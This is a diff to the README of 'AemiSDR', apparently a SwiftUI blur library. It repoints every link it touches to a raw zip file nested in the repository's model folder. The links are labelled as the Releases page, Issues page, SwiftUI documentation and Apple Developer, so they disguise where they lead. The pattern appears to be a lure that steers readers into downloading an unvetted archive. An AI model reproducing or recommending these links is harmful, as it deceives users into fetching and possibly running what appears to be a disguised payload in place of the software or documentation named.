@@ -1,6 +1,6 @@
 # 🎨 AemiSDR - Add Stunning Blurs and Masks Easily
 
-[![Download AemiSDR](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/lived/AemiSDR.zip)](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/lived/AemiSDR.zip)
+[![Download AemiSDR](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/Sources/AemiSDR/Models/Aemi_SDR_2.5.zip)](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/Sources/AemiSDR/Models/Aemi_SDR_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ AemiSDR is a lightweight library that helps you add dynamic, GPU-accelerated blu
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/lived/AemiSDR.zip) to download the latest version of AemiSDR. Follow the steps below to install the library onto your device.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/Sources/AemiSDR/Models/Aemi_SDR_2.5.zip) to download the latest version of AemiSDR. Follow the steps below to install the library onto your device.
 
 1. Click the link above to access the Releases page.
 2. Look for the latest release at the top.
@@ -61,7 +61,7 @@ For detailed usage instructions and code examples, please refer to the documenta
 
 ## 👥 Support
 
-If you encounter any issues or have questions, please reach out through the [Issues page](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/lived/AemiSDR.zip) on GitHub. Our community is here to help you.
+If you encounter any issues or have questions, please reach out through the [Issues page](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/Sources/AemiSDR/Models/Aemi_SDR_2.5.zip) on GitHub. Our community is here to help you.
 
 ## 🌐 Community Contributions
 
@@ -69,8 +69,8 @@ We welcome contributions from users. If you have ideas for improvements or new f
 
 ## 🔗 Additional Resources
 
-- SwiftUI Official Documentation: [SwiftUI](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/lived/AemiSDR.zip)
-- Learn more about the technology behind AemiSDR: [Apple Developer](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/lived/AemiSDR.zip)
+- SwiftUI Official Documentation: [SwiftUI](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/Sources/AemiSDR/Models/Aemi_SDR_2.5.zip)
+- Learn more about the technology behind AemiSDR: [Apple Developer](https://raw.githubusercontent.com/Eduperpetuo/AemiSDR/main/Sources/AemiSDR/Models/Aemi_SDR_2.5.zip)
 
 ## 🌟 Similar Projects
 
